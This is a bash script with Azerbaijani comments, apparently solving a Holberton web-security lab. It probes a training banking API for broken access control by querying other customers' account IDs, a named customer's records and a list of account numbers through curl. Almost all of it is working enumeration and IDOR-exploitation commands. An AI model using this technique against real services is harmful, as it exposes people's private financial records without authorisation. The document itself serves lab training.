#!/bin/bash
# Bu komandları Holberton sistemindəki terminala kopyala-yapışdır
# Cookie olmadan da işləyə bilər (əgər session saxlanırsa)

BASE="http://web0x06.hbtn"

echo "=== STEP 1: Sorgulanmamish account-lari yoxla ==="

curl -s -X POST "$BASE/api/accounts/info" \
  -H "Content-Type: application/json" \
  -b "$(cat ~/.cookies 2>/dev/null || echo '')" \
  -d '{
    "accounts_id":[
      "4bffdf32277f4c538abf6f3991071b05",
      "b7e2b7727aa14735a0168e472beb0f36",
      "1ab87567f42a44d1b157d2a300629ad6",
      "3b001e23b22f4b989f3c005cd14df954"
    ]
  }' | python3 -m json.tool

echo ""
echo "=== STEP 2: Robert Martinez account-larini tap ==="

# Onun customer_id-si ilə info endpoint-ini yoxla
curl -s "$BASE/api/customer/info/cffdbc6379114b4588ecc784cd03aade" | python3 -m json.tool

# Ya da
curl -s -X POST "$BASE/api/customer/info" \
  -H "Content-Type: application/json" \
  -d '{"customer_id":"cffdbc6379114b4588ecc784cd03aade"}' | python3 -m json.tool

echo ""
echo "=== STEP 3: /accounts/ endpoint-ini account NUMBER ile test et ==="
# Task deyir: /accounts/ API endpoint-ini account NUMBER ile islet

for num in 103816261807 104950466023 107732051310 107250100470 102472177812 105653661664; do
  echo -n "Testing number $num: "
  curl -s "$BASE/accounts/$num"
  echo ""
done

echo ""
echo "=== STEP 4: POST /api/accounts/info ile account NUMBER deneme ==="
# Belke account_id degil, number de qebul edir?

curl -s -X POST "$BASE/api/accounts/info" \
  -H "Content-Type: application/json" \
  -d '{"account_number":"103816261807"}' | python3 -m json.tool

curl -s -X POST "$BASE/api/accounts/info" \
  -H "Content-Type: application/json" \
  -d '{"number":"103816261807"}' | python3 -m json.tool

echo ""
echo "=== STEP 5: Dashboard-dan Robert-in account-larini tap ==="
# Dashboard-a girib network tab-dan Robert-in request-lerini izle
# Ya da birbasha:
curl -s "$BASE/dashboard" | grep -i "robert\|cffdbc\|account"
